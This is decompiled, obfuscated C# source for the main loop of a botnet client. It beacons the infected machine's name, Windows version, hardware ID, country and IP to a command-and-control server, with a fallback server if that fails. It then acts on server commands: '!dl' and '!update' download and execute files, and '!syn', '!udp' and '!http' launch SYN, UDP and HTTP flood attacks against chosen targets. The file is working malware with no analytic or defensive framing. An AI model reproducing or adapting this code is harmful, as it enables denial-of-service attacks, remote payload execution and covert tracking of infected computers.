using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

internal sealed class Class7
{
	private static Random random_0 = new Random();

	private static Class3 class3_0 = new Class3();

	private static int int_0 = random_0.Next(2000, 20000);

	private static void Main(string[] args)
	{
		new Class5(Class15.string_5);
		Class2 @class = new Class2();
		@class.method_0();
		string text = string.Empty;
		new Thread(GClass3.smethod_0).Start();
		while (true)
		{
			string string_ = "pcname=" + Environment.MachineName + "&botver=" + Class15.string_4 + "&country=" + Class0.smethod_2().ToLower() + "&winver=" + Class0.smethod_0() + "&hwid=" + Class0.smethod_5() + "&ip=" + Class0.smethod_3();
			string text2 = smethod_1(Class15.string_2, string_);
			if (text2.Length != 0 && text2 != text)
			{
				smethod_0();
				smethod_2(text2);
				text = text2;
			}
			Thread.Sleep(Class15.int_0);
		}
	}

	public static void smethod_0()
	{
		if (Class10.bool_0)
		{
			Class10.smethod_1();
			Class10.bool_0 = false;
		}
		if (Class12.bool_0)
		{
			Class12.smethod_1();
			Class12.bool_0 = false;
		}
		if (class3_0.bool_0)
		{
			class3_0.method_1();
			class3_0.bool_0 = false;
		}
	}

	public static string smethod_1(string string_0, string string_1)
	{
		try
		{
			ServicePointManager.Expect100Continue = false;
			WebRequest webRequest = WebRequest.Create(string_0);
			webRequest.ContentType = "application/x-www-form-urlencoded";
			webRequest.Method = "POST";
			byte[] bytes = Encoding.ASCII.GetBytes(string_1);
			webRequest.ContentLength = bytes.Length;
			Stream requestStream = webRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
			WebResponse response = webRequest.GetResponse();
			if (response == null)
			{
				return null;
			}
			StreamReader streamReader = new StreamReader(response.GetResponseStream());
			return streamReader.ReadToEnd().Trim();
		}
		catch
		{
			smethod_0();
			string string_2 = "pcname=" + Environment.MachineName + "&botver=" + Class15.string_4 + "&country=" + Class0.smethod_2().ToLower() + "&winver=" + Class0.smethod_0() + "&hwid=" + Class0.smethod_5() + "&ip=" + Class0.smethod_3();
			smethod_1(Class15.string_3, string_2);
			return string.Empty;
		}
	}

	private static void smethod_2(string string_0)
	{
		string[] array = string_0.Split(new char[1] { '*' });
		if (string_0.StartsWith("!dl"))
		{
			try
			{
				smethod_0();
				Class1.smethod_0(array[1]);
			}
			catch
			{
			}
		}
		if (string_0.StartsWith("!update"))
		{
			try
			{
				smethod_0();
				Class1.smethod_0(array[1]);
				Class14.smethod_1();
			}
			catch
			{
			}
		}
		if (string_0.StartsWith("!syn"))
		{
			try
			{
				smethod_0();
				Class10.string_0 = array[1];
				Class10.int_0 = Convert.ToInt32(array[2]);
				Class10.int_2 = Convert.ToInt32(array[3]);
				Class10.int_1 = Convert.ToInt32(array[4]);
				Class10.smethod_0();
			}
			catch
			{
			}
		}
		if (string_0.StartsWith("!udp"))
		{
			try
			{
				smethod_0();
				Class12.string_0 = array[1];
				Class12.int_0 = Convert.ToInt32(array[2]);
				Class12.int_2 = Convert.ToInt32(array[3]);
				Class12.int_3 = Convert.ToInt32(array[4]);
				Class12.int_1 = Convert.ToInt32(array[5]);
				Class12.smethod_0();
			}
			catch
			{
			}
		}
		if (!string_0.StartsWith("!http"))
		{
			return;
		}
		try
		{
			smethod_0();
			if (!array[1].Contains("http:"))
			{
				_ = "http://" + array[1];
			}
			class3_0.string_0 = array[1];
			class3_0.method_0();
			class3_0.bool_0 = true;
		}
		catch
		{
		}
	}
}
